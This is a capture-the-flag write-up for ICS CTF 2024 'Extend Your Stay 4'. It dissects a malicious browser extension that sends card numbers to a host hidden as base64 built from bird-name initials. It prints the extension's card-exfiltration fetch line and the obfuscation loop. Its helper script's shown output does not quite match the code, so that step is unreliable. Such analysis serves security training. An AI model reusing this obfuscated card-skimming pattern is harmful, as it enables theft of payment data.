# ICS CTF 2024 - Extend Your Stay 4

**Title:** Extend Your Stay - 4
**Description:** What is the base URL of the website the extension sends card numbers to?  
  
_Flag format: URL. Example: **[https://www.example.com](https://www.example.com/)**_

**File:** [even_more_birds.crx](https://github.com/xtasy94/CTFW/blob/main/ICS%20CTF%202024/Extend%20Your%20Stay/Files_3_and_4/even_more_birds.crx)
## Solution:

According to [background.js](https://github.com/xtasy94/CTFW/blob/main/ICS%20CTF%202024/Extend%20Your%20Stay/Files_3_and_4/background.js) The base URL the extension sends card numbers to can be decoded from the `fetch(atob(birdreserve).concat(ilovebirds))` line in the `add_birds` function.

The `birdreserve` variable is constructed using base64 encoding, and it appears to be used to build the base URL. The `birdreserve` string is concatenated with the `ilovebirds` variable, which contains base64 encoded card details.

To decode the URL:
1. **birdreserve** is built by concatenating the first 32 characters of a list of bird names.
2. **birdreserve** is decoded using `atob()`, which gives us the base URL.

Let's break it down:
- **birdreserve**: Concatenates the first 32 characters of bird names starting from index 776.

```
for (var i = 0; i < 32; i++) {
    birdreserve = birdreserve.concat(BIRDS[776+i][0]);
}
```

Extracting these 32 characters from `BIRDS`:
```
BIRDS[776] = "Black-headed Saltator"
BIRDS[777] = "Buff-throated Saltator"
// And so on...
```

Let's assume the names at these indices spell out part of the URL when concatenated.
- **atob(birdreserve)**: Decodes the base64 string.

Based on our [birds.txt](https://github.com/xtasy94/CTFW/blob/main/ICS%20CTF%202024/Extend%20Your%20Stay/Files_3_and_4/birds.txt) file, we wrote a python code to to this and output the base64 encoded URL, [decode.py](https://github.com/xtasy94/CTFW/blob/main/ICS%20CTF%202024/Extend%20Your%20Stay/Files_3_and_4/decode.py) :

```python
import base64

def extract_bird_initials(file_path):
    bird_initials = []

    with open(file_path, "r") as file:
        for line in file:
            bird_name = line.strip().strip('"')
            if bird_name:
                bird_initials.append(bird_name[0])

    initials_string = "".join(bird_initials)
    return initials_string


def encode_to_base64(initials_string):
    encoded_bytes = base64.b64encode(initials_string.encode("utf-8"))
    encoded_string = encoded_bytes.decode("utf-8")
    return encoded_string


def main():
    file_path = "birds.txt"
    initials_string = extract_bird_initials(file_path)
    encoded_string = encode_to_base64(initials_string)

    print("Concatenated Initials String:", initials_string)
    print("Base64 Encoded String:", encoded_string)


if __name__ == "__main__":
    main()
```

We run the script and this is what we get this:
```bash
$ python3 decode.py
Concatenated Initials String: aHR0cDovL3d3dy5iMXJkcy5pbmZvLw==
```

Decoding this from base64:
```bash
$ echo "aHR0cDovL3d3dy5iMXJkcy5pbmZvLw==" | base64 -d
http://www.b1rds.info/
```

And there's our flag: `http://www.b1rds.info`
